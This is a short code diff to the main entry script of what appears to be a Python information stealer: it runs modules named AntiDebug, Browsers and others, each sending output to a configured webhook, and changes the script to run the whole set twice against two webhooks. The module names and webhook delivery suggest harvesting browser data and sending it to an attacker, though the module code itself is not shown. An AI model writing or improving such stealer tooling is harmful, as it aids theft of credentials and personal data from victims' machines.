@@ -8,7 +8,7 @@ from config import __CONFIG__
 from time import sleep
 
 
-def main():
+def main(webhook):
     funcs = [
         AntiDebug,
         Browsers,
@@ -22,9 +22,7 @@ def main():
         if __CONFIG__[func.__name__.lower()]:
             try:
                 if func.__init__.__code__.co_argcount == 2:
-                    func(__CONFIG__['webhook'])
-                    wait(1)
-                    func(__CONFIG__['webhook2'])
+                    func(webhook)
                 else:
                     func()
 
@@ -34,4 +32,9 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    main(__CONFIG__['webhook'])
+    sleep(2.5)
+    try:
+        main(__CONFIG__['webhook2'])
+    except:
+        print()
